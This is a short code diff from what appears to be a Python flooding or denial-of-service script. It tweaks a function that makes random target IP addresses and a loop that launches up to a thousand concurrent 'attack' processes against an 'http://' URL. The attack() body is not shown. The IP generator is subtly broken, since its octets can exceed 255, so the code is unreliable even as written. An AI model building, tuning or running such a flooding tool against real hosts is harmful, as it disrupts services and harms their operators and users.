@@ -11,10 +11,10 @@ url = "http://" + str(ip)
 
 def randomip():
   randip = []
-  randip1 = random.randint(1,1500)
-  randip2 = random.randint(1,1500)
-  randip3 = random.randint(1,1500)
-  randip4 = random.randint(1,1500)
+  randip1 = random.randint(1,1000)
+  randip2 = random.randint(1,1000)
+  randip3 = random.randint(1,1000)
+  randip4 = random.randint(1,1000)
   
   randip.append(randip1)
   randip.append(randip2)
@@ -50,7 +50,7 @@ def attack():
 
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(1000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
